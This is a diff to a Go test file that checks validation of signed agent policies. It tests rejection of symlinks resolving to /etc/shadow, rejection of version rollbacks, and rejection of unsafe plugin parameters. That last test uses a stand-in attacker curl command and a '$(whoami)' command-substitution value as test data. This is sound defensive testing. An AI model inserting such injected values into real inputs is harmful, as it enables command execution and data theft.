@@ -18,8 +18,8 @@ func validPolicy(source policy.Source) policy.Policy {
 		ExpiresAt: time.Now().Add(time.Hour).UTC(),
 		Sources:   []policy.Source{source},
 		Limits: policy.Limits{
-			MaxSpoolBytes:  1024,
-			MaxBatchBytes:  512,
+			MaxSpoolBytes:   1024,
+			MaxBatchBytes:   512,
 			MaxEventsPerSec: 10,
 		},
 	}
@@ -170,5 +170,89 @@ func TestVerifyAcceptsSignedPolicy(t *testing.T) {
 	}
 	if got.AgentID != p.AgentID || got.Version != p.Version {
 		t.Fatalf("Verify() = %+v, want agent %q version %d", got, p.AgentID, p.Version)
+	}
+}
+
+func TestVerifyAndValidateRejectsResolvedSymlinkEscape(t *testing.T) {
+	pub, priv, err := ed25519.GenerateKey(rand.Reader)
+	if err != nil {
+		t.Fatal(err)
+	}
+	envelope, err := policy.Sign(priv, validPolicy(fileSource("/var/log/app/current.log")))
+	if err != nil {
+		t.Fatalf("Sign() error = %v", err)
+	}
+	env := testEnvironment(func(string) (string, error) { return "/etc/shadow", nil })
+	_, err = policy.VerifyAndValidate(pub, envelope, time.Now(), env)
+	if !errors.Is(err, policy.ErrPathOutsideAllowRoots) {
+		t.Fatalf("VerifyAndValidate() error = %v, want ErrPathOutsideAllowRoots", err)
+	}
+}
+
+func TestVerifyAndValidateAcceptsRegisteredPlugin(t *testing.T) {
+	pub, priv, err := ed25519.GenerateKey(rand.Reader)
+	if err != nil {
+		t.Fatal(err)
+	}
+	p := validPolicy(policy.Source{
+		ID: "postgres-plugin", Kind: policy.SourcePluginMetrics, PluginID: "postgres",
+		Params: map[string]string{"database": "app", "timeout": "5s"}, Interval: 5 * time.Second,
+	})
+	envelope, err := policy.Sign(priv, p)
+	if err != nil {
+		t.Fatalf("Sign() error = %v", err)
+	}
+	got, err := policy.VerifyAndValidate(pub, envelope, time.Now(), testEnvironment(nil))
+	if err != nil {
+		t.Fatalf("VerifyAndValidate() error = %v", err)
+	}
+	if got.Sources[0].PluginID != "postgres" {
+		t.Fatalf("VerifyAndValidate() plugin = %q, want postgres", got.Sources[0].PluginID)
+	}
+}
+
+func TestVerifyAndValidateRejectsVersionAtOrBelowPersistedVersion(t *testing.T) {
+	pub, priv, err := ed25519.GenerateKey(rand.Reader)
+	if err != nil {
+		t.Fatal(err)
+	}
+	p := validPolicy(fileSource("/var/log/app/current.log"))
+	p.Version = 7
+	envelope, err := policy.Sign(priv, p)
+	if err != nil {
+		t.Fatalf("Sign() error = %v", err)
+	}
+	env := testEnvironment(func(path string) (string, error) { return path, nil })
+	env.PreviousVersion = 7
+	_, err = policy.VerifyAndValidate(pub, envelope, time.Now(), env)
+	if !errors.Is(err, policy.ErrPolicyVersionRollback) {
+		t.Fatalf("VerifyAndValidate() error = %v, want ErrPolicyVersionRollback", err)
+	}
+}
+
+func TestValidateRejectsExecutablePluginParameters(t *testing.T) {
+	for name, params := range map[string]map[string]string{
+		"command key":     {"command": "curl https://attacker.invalid"},
+		"shell expansion": {"database": "$(whoami)"},
+	} {
+		t.Run(name, func(t *testing.T) {
+			p := validPolicy(policy.Source{
+				ID: "postgres-plugin", Kind: policy.SourcePluginMetrics, PluginID: "postgres",
+				Params: params, Interval: 5 * time.Second,
+			})
+			err := policy.Validate(p, testEnvironment(nil))
+			if !errors.Is(err, policy.ErrUnsafePluginParameter) {
+				t.Fatalf("Validate() error = %v, want ErrUnsafePluginParameter", err)
+			}
+		})
+	}
+}
+
+func TestValidateAllowsRootDirectory(t *testing.T) {
+	p := validPolicy(fileSource("/var/log/app/current.log"))
+	env := testEnvironment(func(path string) (string, error) { return path, nil })
+	env.AllowedRoots = []string{"/"}
+	if err := policy.Validate(p, env); err != nil {
+		t.Fatalf("Validate() error = %v", err)
 	}
 }
